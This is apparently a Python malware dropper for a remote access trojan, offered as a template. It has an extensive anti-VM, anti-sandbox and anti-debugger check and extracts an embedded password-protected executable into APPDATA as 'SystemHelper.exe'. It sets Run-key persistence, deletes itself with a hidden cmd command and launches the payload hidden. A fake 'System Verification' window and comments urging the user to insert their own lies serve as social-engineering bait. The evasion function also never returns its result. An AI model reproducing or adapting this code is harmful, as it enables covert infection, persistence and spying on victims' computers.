import os
import sys
import time
import json
import subprocess
import requests
import platform
import ctypes
import base64
import tempfile
import socket
import threading
import psutil
import winreg
import urllib.request
from datetime import datetime
import zipfile
import re
from pathlib import Path
import glob
import zipfile
import io
import random
import shutil
import tkinter as tk
from tkinter import messagebox
#A ANTI VM + SNDNBOX + DEBUG EX: 
def is_system_suspicious(min_ram_gb: int = 6) -> bool:
    suspicious_count = 0
    total_checks = 0
    os_type = platform.system()

    try:
        memory = psutil.virtual_memory()
        ram_gb = memory.total / (1024 ** 3)
        total_checks += 1
        if ram_gb < min_ram_gb:
            suspicious_count += 1
    except:
        total_checks += 1
        suspicious_count += 1

    try:
        cpu_count = psutil.cpu_count(logical=False)
        total_checks += 1
        if cpu_count is not None and cpu_count < 2:
            suspicious_count += 1
    except:
        total_checks += 1

    try:
        cpu_freq = psutil.cpu_freq()
        total_checks += 1
        if cpu_freq and cpu_freq.current < 1000:
            suspicious_count += 1
    except:
        total_checks += 1

    try:
        disk = psutil.disk_usage('/')
        disk_gb = disk.total / (1024 ** 3)
        total_checks += 1
        if disk_gb < 40:
            suspicious_count += 1
    except:
        total_checks += 1

    try:
        disk_name = psutil.disk_partitions()[0].device.lower() if psutil.disk_partitions() else ""
        total_checks += 1
        suspicious_disk_names = ['vda', 'vdb', 'hda', 'sda1', 'qemu', 'vmware', 'vbox']
        if any(name in disk_name for name in suspicious_disk_names):
            suspicious_count += 1
    except:
        total_checks += 1

    try:
        total_checks += 1
        suspicious_macs = [
            '08:00:27', '00:0c:29', '00:50:f2', '52:54:00', '00:16:3e',
        ]
        try:
            for interface in psutil.net_if_addrs().values():
                for addr in interface:
                    if hasattr(addr, 'address'):
                        mac = addr.address
                        if any(mac.startswith(suspect) for suspect in suspicious_macs):
                            suspicious_count += 1
                            break
        except:
            pass
    except:
        total_checks += 1

    try:
        hostname = socket.gethostname().lower()
        total_checks += 1
        suspicious_hostnames = [
            'virtualbox', 'vmware', 'kvm', 'xen', 'qemu', 'cuckoo',
            'sandbox', 'lab', 'test', 'vm-', 'virtual', 'docker',
            'container', 'guest', 'analyst', 'analysis'
        ]
        if any(pattern in hostname for pattern in suspicious_hostnames):
            suspicious_count += 1
    except:
        total_checks += 1

    if os_type == 'Windows':
        try:
            output = subprocess.check_output(
                'wmic baseboard get manufacturer',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().lower()
            total_checks += 1

            suspicious_manufacturers = [
                'virtualbox', 'vmware', 'oracle', 'microsoft',
                'parallels', 'innotek', 'qemu', 'xen', 'bochs'
            ]

            if any(mfg in output for mfg in suspicious_manufacturers):
                suspicious_count += 1
        except:
            total_checks += 1

        try:
            output = subprocess.check_output(
                'wmic csproduct get name',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().lower()
            total_checks += 1

            if any(vm in output for vm in ['virtual', 'vmware', 'vbox']):
                suspicious_count += 1
        except:
            total_checks += 1

    suspicious_processes = [
        'ollydbg', 'ida', 'ida64', 'x64dbg', 'windbg', 'gdb', 'lldb',
        'radare2', 'ghidra', 'dnspy', 'ilspy', 'dotpeek', 'procexp',
        'procmon', 'wireshark', 'tcpdump', 'fiddler', 'burpsuite',
        'charles', 'zaproxy', 'apktool', 'frida', 'strace', 'ltrace',
        'sandboxie', 'cuckoo', 'api monitor', 'regmon', 'filemon',
        'vmware-tray', 'vboxservice', 'vmtoolsd', 'parallels',
    ]

    try:
        total_checks += 1
        if os_type == 'Windows':
            output = subprocess.check_output(
                'tasklist',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().lower()

            for proc in suspicious_processes:
                if proc.lower() in output:
                    suspicious_count += 1
        else:
            try:
                for proc in suspicious_processes:
                    result = subprocess.run(
                        f'pgrep -i "{proc}"',
                        shell=True,
                        capture_output=True
                    )
                    if result.returncode == 0:
                        suspicious_count += 1
            except:
                pass
    except:
        pass

    suspicious_paths = {
        'Windows': [
            'C:\\Program Files\\VirtualBox',
            'C:\\Program Files\\VMware',
            'C:\\Program Files (x86)\\VMware',
            'C:\\Windows\\System32\\Drivers\\VBoxMouse.sys',
            'C:\\Windows\\System32\\Drivers\\VBoxGuest.sys',
            'C:\\Program Files\\Oracle\\VirtualBox',
        ],
        'Linux': [
            '/opt/cuckoo',
            '/opt/vmware',
            '/usr/bin/frida',
            '/opt/vbox',
            '/.dockerenv',
            '/run/.containerenv',
            '/proc/vz',
            '/proc/bc',
        ],
        'Darwin': [
            '/Applications/VMware Fusion.app',
            '/Applications/Parallels Desktop.app',
            '/Library/Application Support/VirtualBox',
        ]
    }

    try:
        total_checks += 1
        paths = suspicious_paths.get(os_type, [])
        for path in paths:
            if os.path.exists(path):
                suspicious_count += 1
                break
    except:
        total_checks += 1

    try:
        total_checks += 1
        suspicious_env_vars = [
            'FRIDA_SERVER', 'LD_PRELOAD', 'DYLD_INSERT_LIBRARIES',
            'QEMU', 'SANDBOX', 'DEBUGGER', '_JAVA_OPTIONS'
        ]

        for var in suspicious_env_vars:
            if var in os.environ:
                suspicious_count += 1
                break
    except:
        total_checks += 1

    try:
        total_checks += 1
        if os_type == 'Windows':
            try:
                output = subprocess.check_output(
                    'wmic desktopmonitor get screenheight',
                    shell=True,
                    stderr=subprocess.DEVNULL
                ).decode()

                height = int([x for x in output.split('\n') if x.strip() and x.strip() != 'ScreenHeight'][0].strip())

                if height < 600:
                    suspicious_count += 1
            except:
                pass
    except:
        total_checks += 1

    try:
        total_checks += 1
        if os_type == 'Linux':
            try:
                with open('/proc/cmdline', 'r') as f:
                    cmdline = f.read().lower()
                    if 'vga=' in cmdline or 'xenfb' in cmdline:
                        suspicious_count += 1
            except:
                pass
    except:
        total_checks += 1

    try:
        total_checks += 1
        if os_type == 'Linux':
            try:
                with open('/sys/firmware/dmi/tables/DMI', 'rb') as f:
                    dmi_data = f.read().decode('utf-8', errors='ignore').lower()

                    suspicious_dmi = [
                        'innotek', 'virtualbox', 'vmware', 'qemu',
                        'bochs', 'parallels', 'xen'
                    ]

                    if any(dmi in dmi_data for dmi in suspicious_dmi):
                        suspicious_count += 1
            except:
                pass
    except:
        total_checks += 1

    try:
        total_checks += 1
        suspicious_ports = {
            5555: 'ADB',
            8888: 'Proxy/Debugger',
            1234: 'GDB Server',
            31337: 'Frida Server',
            9090: 'Debug Server',
        }

        connections = psutil.net_connections()
        open_ports = [conn.laddr.port for conn in connections if conn.status == 'LISTEN']

        for port in suspicious_ports:
            if port in open_ports:
                suspicious_count += 1
                break
    except:
        total_checks += 1

    try:
        total_checks += 1
        test_file = '/tmp/disk_speed_test.txt' if os_type != 'Windows' else 'C:\\Windows\\Temp\\disk_speed_test.txt'

        with open(test_file, 'w') as f:
            f.write('x' * 1000000)

        os.remove(test_file)
    except:
        total_checks += 1

    if os_type == 'Windows':
        try:
            total_checks += 1
            registry_paths = [
                r'HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0',
                r'HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}',
            ]

            for path in registry_paths:
                try:
                    output = subprocess.check_output(
                        f'reg query "{path}"',
                        shell=True,
                        stderr=subprocess.DEVNULL
                    ).decode().lower()

                    if any(vm in output for vm in ['virtual', 'vmware', 'vbox']):
                        suspicious_count += 1
                        break
                except:
                    pass
        except:
            total_checks += 1

    if os_type == 'Linux':
        try:
            total_checks += 1
            with open('/proc/cpuinfo', 'r') as f:
                cpuinfo = f.read().lower()

                if any(vm in cpuinfo for vm in ['kvm', 'hypervisor', 'vmware', 'xen']):
                    suspicious_count += 1
        except:
            total_checks += 1

    if os_type == 'Linux':
        try:
            total_checks += 1
            output = subprocess.check_output(
                'dmesg | grep -i virtual',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().lower()

            if output.strip():
                suspicious_count += 1
        except:
            total_checks += 1

    if os_type == 'Windows':
        try:
            total_checks += 1
            suspicious_services = [
                'VBoxService', 'VBoxTray', 'VMUSBArbService',
                'vmci', 'vmmouse', 'vmxnet', 'prl_nic',
                'Sysmon', 'Autoruns', 'WinDbg'
            ]

            output = subprocess.check_output(
                'wmic service list brief',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().lower()

            for service in suspicious_services:
                if service.lower() in output:
                    suspicious_count += 1
                    break
        except:
            total_checks += 1

    if os_type == 'Windows':
        try:
            total_checks += 1
            output = subprocess.check_output(
                'wmic logicaldisk get name',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().lower()

            drives = [line.strip() for line in output.split('\n') if line.strip() and ':' in line]
            if len(drives) < 1:
                suspicious_count += 1
        except:
            total_checks += 1

    try:
        total_checks += 1
        adapters = psutil.net_if_addrs()

        if len(adapters) < 1:
            suspicious_count += 1
    except:
        total_checks += 1

    try:
        total_checks += 1
        stats = psutil.net_if_stats()

        for name, stat in stats.items():
            if stat.speed == 0:
                suspicious_count += 1
                break
    except:
        total_checks += 1

    if os_type == 'Linux':
        try:
            total_checks += 1
            with open('/proc/self/cgroup', 'r') as f:
                cgroups = f.read().lower()

                if 'docker' in cgroups or 'lxc' in cgroups or 'kubepods' in cgroups:
                    suspicious_count += 1
        except:
            total_checks += 1

    if os_type == 'Linux':
        try:
            total_checks += 1
            if os.path.exists('/proc/xen'):
                suspicious_count += 1
        except:
            total_checks += 1

    if os_type == 'Linux':
        try:
            total_checks += 1
            with open('/proc/sys/kernel/yama/ptrace_scope', 'r') as f:
                ptrace = f.read().strip()

                if ptrace == '0':
                    suspicious_count += 1
        except:
            total_checks += 1

    try:
        total_checks += 1
        processes = [p.info['name'].lower() for p in psutil.process_iter(['name'])]
    except:
        total_checks += 1

    try:
        total_checks += 1
        memory = psutil.virtual_memory()

        if memory.percent < 10:
            suspicious_count += 0.5
    except:
        total_checks += 1

    if os_type == 'Windows':
        try:
            total_checks += 1
            output = subprocess.check_output(
                'wmic useraccount list brief',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode()

            users = [line for line in output.split('\n') if line.strip()]

            if len(users) < 2:
                suspicious_count += 0.5
        except:
            total_checks += 1

    try:
        total_checks += 1
        boot_time = psutil.boot_time()
        current_time = os.times()[4]

        uptime_seconds = current_time - boot_time

        if uptime_seconds < 300:
            suspicious_count += 0.5
    except:
        total_checks += 1

    try:
        total_checks += 1
        if os_type == 'Windows':
            output = subprocess.check_output(
                'wmic path win32_videocontroller get name',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().lower()

            if 'qxl' in output or 'vga' in output or 'vmsvga' in output:
                suspicious_count += 1

        elif os_type == 'Linux':
            output = subprocess.check_output(
                'lspci | grep -i vga',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode().lower()

            if any(gpu in output for gpu in ['qemu', 'vmware', 'virtual', 'cirrus', 'bochs']):
                suspicious_count += 1
    except:
        total_checks += 1

    if total_checks == 0:
        total_checks = 1

    suspicion_percentage = (suspicious_count / total_checks) * 100



PERSIST_NAME = "SystemHelper.exe" #fake name 
ZIP_PASSWORD = b'type your pass' #type the password you use to make zip of the rat.exe prefer using "7ZIP"=============================================================
ZIP_DATA= """ADD ZIP DATA YOU CAN MAKE IT WITH SIMPLE CODE SEARCH IF YOU DON/'T KNOW  """ #ZIP DATA HERE ========================================
def extract_embedded_zip():
    try:
        appdata_dir = os.getenv('APPDATA')
        persist_folder = os.path.join(appdata_dir, 'SystemHelper')
        os.makedirs(persist_folder, exist_ok=True)
        dest_file = os.path.join(persist_folder, PERSIST_NAME)
        zip_bytes = base64.b64decode(ZIP_DATA)
        temp_zip = os.path.join(persist_folder, 'temp.zip')
        with open(temp_zip, 'wb') as f:
            f.write(zip_bytes)
        extract_folder = os.path.join(persist_folder, 'extracted')
        os.makedirs(extract_folder, exist_ok=True)
        with zipfile.ZipFile(temp_zip, 'r') as zip_ref:
            zip_ref.extractall(extract_folder, pwd=ZIP_PASSWORD)
        for root, dirs, files in os.walk(extract_folder):
            for file in files:
                if file.endswith('.exe'):
                    src_file = os.path.join(root, file)
                    shutil.copy2(src_file, dest_file)
                    os.remove(temp_zip)
                    shutil.rmtree(extract_folder)
                    return dest_file
        return None
    except:
        return None



#more adding to start up
def setup_persistence():
    try:
        current_file = sys.executable
        appdata_dir = os.getenv('APPDATA')
        persist_folder = os.path.join(appdata_dir, 'SystemHelper')
        os.makedirs(persist_folder, exist_ok=True)

        dest_file = os.path.join(persist_folder, PERSIST_NAME)

        if current_file == dest_file:
            return None

        if not os.path.exists(dest_file):
            dest_file = extract_embedded_zip()
            if not dest_file:
                return None

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        key_name = f"System_{random.randint(1000, 9999)}"
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, f'"{dest_file}"')
        winreg.CloseKey(key)

        return dest_file
    except:
        return None

def delete_original():
    time.sleep(9) #just to match the massege i make it's to wait for zip data to become exe and run it in the background you can remeve it and make your own lie
    try:
        if getattr(sys, 'frozen', False):
            original_file = sys.executable
#some waiting to delete file 
            cmd = f'cmd /c ping 127.0.0.1 -n 4 > nul & del /f /q "{original_file}"'

            subprocess.Popen(
                cmd,
                creationflags=subprocess.CREATE_NO_WINDOW,
                shell=True
            )

    except Exception:
        pass

def show_message():
    root = tk.Tk()
    root.withdraw()
#you can type and lie you want :)
    messagebox.showinfo(
        "Warning",
        "You've been tricked! Stop downloading cheating programs.\n"
        "This app will be removed after 10s. You are a hero without cheating! :)"
    )


    root.quit()
    root.destroy()
    delete_original()




if __name__ == "__main__":
#type any Social-Engineering thing or make a real cheat or something
    root = tk.Tk()
    root.title("System Check")
    root.geometry("400x200")
    root.configure(bg='#2c3e50')

    label = tk.Label(root, text="System Verification Required", font=("Arial", 16, "bold"), fg="white", bg='#2c3e50')
    label.pack(pady=20)

    button = tk.Button(root, text="Click Here to Verify", command=show_message,
                       font=("Arial", 14), bg="#e74c3c", fg="white", relief="raised", bd=3)
    button.pack(pady=30)

    root.mainloop()
    if is_system_suspicious():
        sys.exit() #exit or act like a normal app
    else: #spy=================================================================
        dest_file = setup_persistence()
        if dest_file:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            subprocess.Popen([dest_file], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
       
